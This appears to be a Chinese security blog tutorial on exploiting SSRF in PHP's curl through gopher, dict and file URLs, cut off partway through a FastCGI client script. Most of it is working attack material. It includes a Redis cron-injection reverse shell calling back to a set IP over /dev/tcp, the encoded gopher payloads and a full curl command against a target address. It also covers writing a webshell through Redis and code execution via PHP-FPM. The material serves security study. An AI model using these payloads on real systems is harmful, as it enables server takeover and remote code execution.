<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params">$url</span>)</span>&#123;  </span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = $_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">curl($url); </span><br></pre></td></tr></table></figure>
<p>下面就详细讲一下curl函数在ssrf中的具体利用方式。</p>
<h2 id="利用方式">利用方式</h2>
<h3 id="一些协议的理解">一些协议的理解</h3>
<p>在讲利用方式之前，我们先来看看curl命令支持哪些网络协议：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@ca01h:/var/www/html/ssrf<span class="comment"># curl -V</span></span><br><span class="line">url 7.66.0 (x86_64-pc-linux-gnu) libcurl/7.66.0 OpenSSL/1.1.1d zlib/1.2.11 brotli/1.0.7 libidn2/2.2.0 libpsl/0.20.2 (+libidn2/2.0.5) libssh2/1.8.0 nghttp2/1.39.2 librtmp/2.3</span><br><span class="line">Release-Date: 2019-09-11</span><br><span class="line">Protocols: dict file ftp ftps gopher http https imap imaps ldap ldaps pop3 pop3s rtmp rtsp scp sftp smb smbs smtp smtps telnet tftp </span><br><span class="line">Features: AsynchDNS brotli GSS-API HTTP2 HTTPS-proxy IDN IPv6 Kerberos Largefile libz NTLM NTLM_WB PSL SPNEGO SSL TLS-SRP UnixSockets</span><br></pre></td></tr></table></figure>
<p>可以看到该版本的curl支持很多协议，其中gopher协议、dict协议、file协议、http/s协议用的比较多。</p>
<h4 id="gopher">gopher</h4>
<p><a href="https://zh.wikipedia.org/wiki/Gopher_(%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE)">Gopher wiki</a></p>
<p>互联网上使用的分布型的文件搜集获取网络协议，出现在http协议之前。（可以模拟GET/POST请求，换行使用%0d%0a，空白行%0a）。</p>
<p>gopher协议的格式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</span><br></pre></td></tr></table></figure>
<p>gopher协议在curl命令中的使用方式：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl gopher://localhost:2222/hello%0agopher</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191208095637.png" alt=""></p>
<p>通过nc回显可以发现，数据换行了， 然而 hello 只回显了 ello ，也就是说 h “被吃了”, 因此要在传输的数据前加一个无用字符：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl gopher://localhost:2222/_hello%0agopher</span><br></pre></td></tr></table></figure>
<blockquote>
<p>如果是在地址栏利用payload时，需要进行一次url编码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.130&#x2F;ssrf.php?url&#x3D;gopher:&#x2F;&#x2F;localhost:2222&#x2F;_hello%250agopher</span><br></pre></td></tr></table></figure>
</blockquote>
<p>再利用ssrf.php：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@ca01h ~]<span class="comment"># nc -l -vv 2333</span></span><br><span class="line">Ncat: Version 6.40 ( http://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::2333</span><br><span class="line">Ncat: Listening on 0.0.0.0:2333</span><br><span class="line">Ncat: Connection from 127.0.0.1.</span><br><span class="line">Ncat: Connection from 127.0.0.1:47726</span><br><span class="line"> </span><br><span class="line">[root@ca01h html]<span class="comment"># curl -v &#x27;http://127.0.0.1/ssrf.php?url=gopher://127.0.0.1:2333/_test&#x27;</span></span><br><span class="line"> </span><br><span class="line">[root@ca01h ~]<span class="comment"># nc -l -vv 2333</span></span><br><span class="line">Ncat: Version 6.40 ( http://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::2333</span><br><span class="line">Ncat: Listening on 0.0.0.0:2333</span><br><span class="line">Ncat: Connection from 127.0.0.1.</span><br><span class="line">Ncat: Connection from 127.0.0.1:47726.</span><br><span class="line"><span class="built_in">test</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="dict">dict</h4>
<p>字典服务器协议。dict是基于查询相应的TCP协议。服务器监听端口2628。漏洞代码没有屏蔽回显的情况下，可以利用dict协议获取ssh等服务版本信息。</p>
<p>因为ssrf.php的漏洞代码有回显，所以curl命令直接访问</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -v http://localhost/ssrf/ssrf.php?url=dict://127.0.0.1:6379/info</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>即可看到redis的相关配置。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -v http://localhost/ssrf/ssrf.php?url=dict://127.0.0.1:22/info</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>即可看到ssh的banner信息。</p>
<p>如果ssrf.php中加上一行屏蔽回显的代码<code>curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</code>，那么这种方式就失效了，和gopher一样，只能利用nc监听端口，反弹传输数据了。</p>
<h4 id="file">file</h4>
<p>本地文件传输协议，主要用于访问本地计算机中的文件。</p>
<p>因为ssrf.php的漏洞代码有回显，所以浏览器直接访问：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191208104710.png" alt=""></p>
<h4 id="http-s">http/s</h4>
<p>主要用来探测内网服务。根据响应的状态判断内网端口及服务，可以结合java系列0day和其他各种0day使用。</p>
<h3 id="攻击Redis">攻击Redis</h3>
<blockquote>
<p>目标：阿里云服务器 Centos7 IP：47.97.199.89</p>
<p>攻击：华为云服务器 Centos7 IP：121.36.45.17</p>
<p>具体环境搭建请转到文章末尾的Appendix B。</p>
</blockquote>
<h4 id="Redis反弹Shell（root权限）">Redis反弹Shell（root权限）</h4>
<blockquote>
<p>什么是反弹Shell：<a href="https://xz.aliyun.com/t/2549">https://xz.aliyun.com/t/2549</a></p>
</blockquote>
<p>先写一个redis反弹shell的bash脚本如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#shell.sh</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/121.36.45.17/2333 0&gt;&amp;1\n\n\n&quot;</span>|redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> -x <span class="built_in">set</span> 1</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> config <span class="built_in">set</span> dir /var/spool/cron/</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> config <span class="built_in">set</span> dbfilename root</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> save</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> quit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>在redis的第0个数据库中添加key为1，value为\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/121.36.45.17/2333 0&gt;&amp;1\n\n\n\n的字段。最后会多出一个n是因为echo重定向最后会自带一个换行符。<code>CONFIG SET</code> 命令动态地调整 Redis 服务器的配置，每个用户生成的crontab文件，都会放在 /var/spool/cron/ 目录下面，<code>set</code>直接往当前用户的crontab里写入反弹shell。</p>
<p>想获取Redis攻击的TCP数据包，可以使用socat进行端口转发。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">socat -v tcp-listen:4444,fork tcp-connect:localhost:6379</span><br><span class="line">bash shell.sh 127.0.0.1 4444</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>意思是将本机的4444端口转发到本机的6379端口。访问该服务器的4444端口，访问的其实是该服务器的6379端口。捕获到数据如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; 2019&#x2F;12&#x2F;16 13:50:01.167534  length&#x3D;89 from&#x3D;0 to&#x3D;88</span><br><span class="line">*3\r</span><br><span class="line">$3\r</span><br><span class="line">set\r</span><br><span class="line">$1\r</span><br><span class="line">1\r</span><br><span class="line">$62\r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;121.36.45.179&#x2F;2333 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">\r</span><br><span class="line">&lt; 2019&#x2F;12&#x2F;16 13:50:01.167814  length&#x3D;5 from&#x3D;0 to&#x3D;4</span><br><span class="line">+OK\r</span><br><span class="line">&gt; 2019&#x2F;12&#x2F;16 13:50:01.171555  length&#x3D;57 from&#x3D;0 to&#x3D;56</span><br><span class="line">*4\r</span><br><span class="line">$6\r</span><br><span class="line">config\r</span><br><span class="line">$3\r</span><br><span class="line">set\r</span><br><span class="line">$3\r</span><br><span class="line">dir\r</span><br><span class="line">$16\r</span><br><span class="line">&#x2F;var&#x2F;spool&#x2F;cron&#x2F;\r</span><br><span class="line">&lt; 2019&#x2F;12&#x2F;16 13:50:01.171779  length&#x3D;5 from&#x3D;0 to&#x3D;4</span><br><span class="line">+OK\r</span><br><span class="line">&gt; 2019&#x2F;12&#x2F;16 13:50:01.175397  length&#x3D;52 from&#x3D;0 to&#x3D;51</span><br><span class="line">*4\r</span><br><span class="line">$6\r</span><br><span class="line">config\r</span><br><span class="line">$3\r</span><br><span class="line">set\r</span><br><span class="line">$10\r</span><br><span class="line">dbfilename\r</span><br><span class="line">$4\r</span><br><span class="line">root\r</span><br><span class="line">&lt; 2019&#x2F;12&#x2F;16 13:50:01.175619  length&#x3D;5 from&#x3D;0 to&#x3D;4</span><br><span class="line">+OK\r</span><br><span class="line">&gt; 2019&#x2F;12&#x2F;16 13:50:01.179000  length&#x3D;14 from&#x3D;0 to&#x3D;13</span><br><span class="line">*1\r</span><br><span class="line">$4\r</span><br><span class="line">save\r</span><br><span class="line">&lt; 2019&#x2F;12&#x2F;16 13:50:01.185711  length&#x3D;5 from&#x3D;0 to&#x3D;4</span><br><span class="line">+OK\r</span><br><span class="line">&gt; 2019&#x2F;12&#x2F;16 13:50:01.189649  length&#x3D;14 from&#x3D;0 to&#x3D;13</span><br><span class="line">*1\r</span><br><span class="line">$4\r</span><br><span class="line">quit\r</span><br><span class="line">&lt; 2019&#x2F;12&#x2F;16 13:50:01.189817  length&#x3D;5 from&#x3D;0 to&#x3D;4</span><br><span class="line">+OK\r</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>转换规则如下：</p>
<ul>
<li>如果第一个字符是<code>&gt;</code>或者<code>&lt; </code>那么丢弃该行字符串，表示请求和返回的时间。</li>
<li>如果前3个字符是<code>+OK</code> 那么丢弃该行字符串，表示返回的字符串。</li>
<li>将<code>\r</code>字符串替换成<code>%0d%0a</code></li>
<li>空白行替换为<code>%0a</code></li>
</ul>
<p>转换脚本：<code>tran2gopher.py</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python tran2gopher.py socat.log</span><br><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"><span class="comment">#author: JoyChou</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">exp = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(sys.argv[<span class="number">1</span>]) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">0</span>] <span class="keyword">in</span> <span class="string">&#x27;&gt;&lt;+&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> line[<span class="number">1</span>] <span class="keyword">in</span> <span class="string">&#x27;?&#x27;</span>:</span><br><span class="line">                exp = exp + line</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="comment"># 判断倒数第2、3字符串是否为\r</span></span><br><span class="line">        <span class="keyword">elif</span> line[<span class="number">-3</span>:<span class="number">-1</span>] == <span class="string">r&#x27;\r&#x27;</span>:</span><br><span class="line">            <span class="comment"># 如果该行只有\r，将\r替换成%0a%0d%0a</span></span><br><span class="line">            <span class="keyword">if</span> len(line) == <span class="number">3</span>:</span><br><span class="line">                exp = exp + <span class="string">&#x27;%0a%0d%0a&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                line = line.replace(<span class="string">r&#x27;\r&#x27;</span>, <span class="string">&#x27;%0d%0a&#x27;</span>)</span><br><span class="line">                <span class="comment"># 去掉最后的换行符</span></span><br><span class="line">                line = line.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">                exp = exp + line</span><br><span class="line">        <span class="comment"># 判断是否是空行，空行替换为%0a</span></span><br><span class="line">        <span class="keyword">elif</span> line == <span class="string">&#x27;\x0a&#x27;</span>:</span><br><span class="line">            exp = exp + <span class="string">&#x27;%0a&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            line = line.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            exp = exp + line</span><br><span class="line">exp.replace(<span class="string">&quot;$&quot;</span>, <span class="string">&quot;%24&quot;</span>)</span><br><span class="line">exp.replace(<span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;%3C&quot;</span>)</span><br><span class="line">exp.replace(<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;%3E&quot;</span>)</span><br><span class="line">exp.replace(<span class="string">&quot;?&quot;</span>, <span class="string">&quot;%3F&quot;</span>)</span><br><span class="line"><span class="keyword">print</span> exp</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>结果为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$62%0d%0a%0a%0a%0a*&#x2F;1 * * * * bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;121.36.45.179&#x2F;2333 0&gt;&amp;1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a&#x2F;var&#x2F;spool&#x2F;cron&#x2F;%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>在攻击方执行命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -v <span class="string">&#x27;gopher://47.97.199.89</span></span><br><span class="line"><span class="string">:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$62%0d%0a%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/121.36.45.179/2333 0&gt;&amp;1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>出现5个ok，则成功了写入：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Trying 47.97.199.89:6379...</span><br><span class="line">* TCP_NODELAY set</span><br><span class="line">* Connected to 47.97.199.89 (47.97.199.89) port 6379 (#0)</span><br><span class="line">+OK</span><br><span class="line">+OK</span><br><span class="line">+OK</span><br><span class="line">+OK</span><br><span class="line">+OK</span><br><span class="line">* Closing connection 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>那再检测以下Redis写入的字段和crontab的内容。</p>
<ul>
<li>检测Redis数据库的字段为<code>&quot;\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/2333 0&gt;&amp;1\n\n\n\n&quot;</code></li>
<li>检测crontab的内容也没有问题。</li>
</ul>
<p>最后在目标机上监听端口2333：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvvp 2333</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>稍等一下，就可以成功反弹shell。</p>
<h4 id="获取-web-服务的-webshell">获取 web 服务的 webshell</h4>
<p>当 redis 权限不高时，并且服务器开着 web 服务，在 redis 有 web 目录写权限时，可以尝试往 web 路径写 webshell。</p>
<p>模仿上面的shell脚本来写：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># shell2.php</span></span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> flushall</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> config <span class="built_in">set</span> dir /var/www/</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> config <span class="built_in">set</span> dbfilename shell.php</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> <span class="built_in">set</span> webshell <span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span></span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> save</span><br><span class="line">redis-cli -h <span class="variable">$1</span> -p <span class="variable">$2</span> quit</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意：一定要在$POST前面加上转义符\，不然在最后的文件里面$_POST会被吞掉！！！（因为$符号是redis的一种语法）</p>
</blockquote>
<p>执行shell2.php，同样使用socat在4444端口转发。</p>
<p>捕获到的数据如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*1\r</span><br><span class="line">$8\r</span><br><span class="line">flushall\r</span><br><span class="line">*4\r</span><br><span class="line">$6\r</span><br><span class="line">config\r</span><br><span class="line">$3\r</span><br><span class="line">set\r</span><br><span class="line">$3\r</span><br><span class="line">dir\r</span><br><span class="line">$8\r</span><br><span class="line">&#x2F;var&#x2F;www\r</span><br><span class="line">*4\r</span><br><span class="line">$6\r</span><br><span class="line">config\r</span><br><span class="line">$3\r</span><br><span class="line">set\r</span><br><span class="line">$10\r</span><br><span class="line">dbfilename\r</span><br><span class="line">$9\r</span><br><span class="line">shell.php\r</span><br><span class="line">*3\r</span><br><span class="line">$3\r</span><br><span class="line">set\r</span><br><span class="line">$3\r</span><br><span class="line">web\r</span><br><span class="line">$18\r</span><br><span class="line">%3C%3Fphp%20phpinfo()%3B%3F%3E\r</span><br><span class="line">*1\r</span><br><span class="line">$4\r</span><br><span class="line">save\r</span><br><span class="line">*1\r</span><br><span class="line">$4\r</span><br><span class="line">quit\r</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>参考joychou写cron的脚本转换，python转换脚本如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f &#x3D; open(&#39;payload.txt&#39;, &#39;r&#39;)</span><br><span class="line">s &#x3D; &#39;&#39;</span><br><span class="line">for line in f.readlines():</span><br><span class="line">        line &#x3D; line.replace(r&quot;\r&quot;, &quot;%0d%0a&quot;)</span><br><span class="line">        line &#x3D; line.replace(&quot;\n&quot;, &#39;&#39;)</span><br><span class="line">        s &#x3D; s + line</span><br><span class="line">print s.replace(&quot;$&quot;, &quot;%24&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>如上的写shell数据流经过编码如下(注意php一句话，经过上面转换还是尖括号，但是使用curl发送的时候要把一句话的两个尖括号和<code>;</code>和<code>?</code>url编码，然后使用curl直接发送如下，我也不知道为啥<code>$</code>还要编码，知道的同学请告知，谢谢）:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@ca0y1h-centos ~]<span class="comment"># python tran2gopher.py socat2.log</span></span><br><span class="line">curl -v <span class="string">&quot;gopher://127.0.0.1:6379/_*1%0d%0a%248%0d%0aflushall%0d%0a*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%243%0d%0adir%0d%0a%248%0d%0a/var/www%0d%0a*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%2410%0d%0adbfilename%0d%0a%249%0d%0ashell.php%0d%0a*3%0d%0a%243%0d%0aset%0d%0a%243%0d%0aweb%0d%0a%2418%0d%0a%3C%3Fphp phpinfo()%3B%3F%3E%0d%0a*1%0d%0a%244%0d%0asave%0d%0aquit%0d%0a&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>然后上面的payload在存在ssrf的时候，使用发送之前要再url编码一次，发送即可得到shell。</p>
<h3 id="攻击fastcgi（TCP模式）">攻击fastcgi（TCP模式）</h3>
<blockquote>
<p>环境搭建请转到文章莫问的Appendix B。</p>
</blockquote>
<h4 id="什么是fastcgi">什么是fastcgi</h4>
<p>请转到文章末尾的Appendix A。</p>
<p>fastcgi默认监听端口为本机的9000端口，如果对外开放的话就有可能造成任意代码执行（具体看p牛文章介绍，讲的非常详细了）。但是一般情况不会对外开放的，所以此时需要配合gopher+ssrf加以利用。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">条件: </span><br><span class="line">libcurl版本&gt;&#x3D;7.45.0 (exp中存在%00，curl版本小于7.45.0，gopher的%00会被截断) </span><br><span class="line">PHP-FPM监听端口 </span><br><span class="line">PHP-FPM版本 &gt;&#x3D; 5.3.3 </span><br><span class="line">知道服务器上任意一个php文件的绝对路径</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="远程攻击php-fpm">远程攻击php-fpm</h4>
<p>这个场景是有些管理员为了方便吧,把fastcgi监听端口设置为: <code>listen = 0.0.0.0:9000</code>而不是<code>listen = 127.0.0.1:9000</code> 这样子可以导致远程代码执行。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191210160010.png" alt=""></p>
<p>这里利用p牛的exploit脚本:</p>
<p><a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">fpm.py</a></p>
<p>python命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python fpm.py -c <span class="string">&#x27;&lt;?php echo `id`;exit;?&gt;&#x27;</span> 192.168.188.130 /var/www/html/index.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191210160340.png" alt=""></p>
<h4 id="SSRF攻击本地的php-fpm">SSRF攻击本地的php-fpm</h4>
<h5 id="基本原理">基本原理</h5>
<p>PHP-FPM开放在公网上的情况是很少的，大部分时候都是启动在本地即监听127.0.0.1:9000地址的。</p>
<p>虽然我们没有办法直接对PHP-FPM发起攻击，但是我们可以结合其他漏洞来间接利用。如果目标站点存在SSRF漏洞，那么我们就可以借助SSRF来攻击本地PHP-FPM服务，达到任意代码执行的效果。</p>
<h5 id="利用方式-v2">利用方式</h5>
<p>之前已经提到Gopher协议在SSRF利用中被广泛运用，其URL格式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;&lt;host&gt;:&lt;port&gt;&#x2F;&lt;gopher-path&gt;_后接TCP数据流</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>也就是说，通过Gopher协议，我们可以直接发送TCP协议流，再进行urlencode编码来构造SSRF攻击代码，其中攻击代码就是恶意FastCGI协议报文。</p>
<p>这里有三种方式来生成恶意FastCGI协议报文：</p>
<p>一种是不用修改P牛的脚本，在本即上直接将流量打到某一个端口（比如9999），同时监听此端口，再保存到本地后进行url编码（此时要求本机上也有php-fpm服务）。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 本机监听</span></span><br><span class="line">[root@ca01h ~] nc -lvvp 9999 &gt; exp.txt</span><br><span class="line">Ncat: Version 7.50 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::9999</span><br><span class="line">Ncat: Listening on 0.0.0.0:9999</span><br><span class="line"></span><br><span class="line"><span class="comment"># 本机执行</span></span><br><span class="line">[root@ca01h ~] python fpm.py 127.0.0.1 /usr/share/nginx/html/index.php -c <span class="string">&quot;&lt;?php echo `whoami`; exit();?&gt;&quot;</span> -p 9999</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这样exp.txt中就我们所需要的恶意FastCGI协议报文，再用下面的小脚本对其urlencode得到最终的Payload：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;exp.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	pld = f.read()</span><br><span class="line"><span class="keyword">print</span> quote(pld)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<blockquote>
<p>nginx解码一次,php-fpm解码一次。</p>
</blockquote>
<p>第二种是修改P牛的脚本，让其直接返回请求的报文并将其urlencode一次：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> six.moves.urllib <span class="keyword">import</span> parse <span class="keyword">as</span> urlparse</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line"><span class="comment"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span></span><br><span class="line"></span><br><span class="line">PY2 = <span class="literal">True</span> <span class="keyword">if</span> sys.version_info.major == <span class="number">2</span> <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bchr</span>(<span class="params">i</span>):</span></span><br><span class="line">    <span class="keyword">if</span> PY2:</span><br><span class="line">        <span class="keyword">return</span> force_bytes(chr(i))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> bytes([i])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bord</span>(<span class="params">c</span>):</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(c, int):</span><br><span class="line">        <span class="keyword">return</span> c</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> ord(c)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_bytes</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(s, bytes):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> s.encode(<span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;strict&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">force_text</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">if</span> issubclass(type(s), str):</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">if</span> isinstance(s, bytes):</span><br><span class="line">        s = str(s, <span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;strict&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s = str(s)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FastCGIClient</span>:</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># private</span></span><br><span class="line">    __FCGI_VERSION = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    __FCGI_ROLE_RESPONDER = <span class="number">1</span></span><br><span class="line">    __FCGI_ROLE_AUTHORIZER = <span class="number">2</span></span><br><span class="line">    __FCGI_ROLE_FILTER = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    __FCGI_TYPE_BEGIN = <span class="number">1</span></span><br><span class="line">    __FCGI_TYPE_ABORT = <span class="number">2</span></span><br><span class="line">    __FCGI_TYPE_END = <span class="number">3</span></span><br><span class="line">    __FCGI_TYPE_PARAMS = <span class="number">4</span></span><br><span class="line">    __FCGI_TYPE_STDIN = <span class="number">5</span></span><br><span class="line">    __FCGI_TYPE_STDOUT = <span class="number">6</span></span><br><span class="line">    __FCGI_TYPE_STDERR = <span class="number">7</span></span><br><span class="line">    __FCGI_TYPE_DATA = <span class="number">8</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES = <span class="number">9</span></span><br><span class="line">    __FCGI_TYPE_GETVALUES_RESULT = <span class="number">10</span></span><br><span class="line">    __FCGI_TYPE_UNKOWNTYPE = <span class="number">11</span></span><br><span class="line"></span><br><span class="line">    __FCGI_HEADER_SIZE = <span class="number">8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># request state</span></span><br><span class="line">    FCGI_STATE_SEND = <span class="number">1</span></span><br><span class="line">    FCGI_STATE_ERROR = <span 